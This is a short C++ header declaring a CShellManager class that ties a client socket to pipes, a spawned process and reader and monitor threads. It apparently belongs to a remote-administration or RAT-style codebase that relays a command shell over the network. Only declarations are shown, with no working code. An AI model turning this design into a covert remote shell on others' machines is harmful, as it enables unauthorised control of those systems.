// ShellManager.h: interface for the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#pragma once
#include "stdafx.h"
#include "Manager.h"

class CShellManager : public CManager  
{
public:
	CShellManager(CClientSocket *pClient,UINT ID);
	virtual ~CShellManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	HANDLE m_hReadPipeHandle;   
	HANDLE m_hWritePipeHandle; 
	HANDLE m_hReadPipeShell;
	HANDLE m_hWritePipeShell;

	HANDLE m_hProcessHandle;
	HANDLE m_hThreadHandle;
	HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;
	
	UINT	m_ID;
	static UINT WINAPI ReadPipeThread(LPVOID lparam);
	static UINT WINAPI MonitorThread(LPVOID lparam);
};
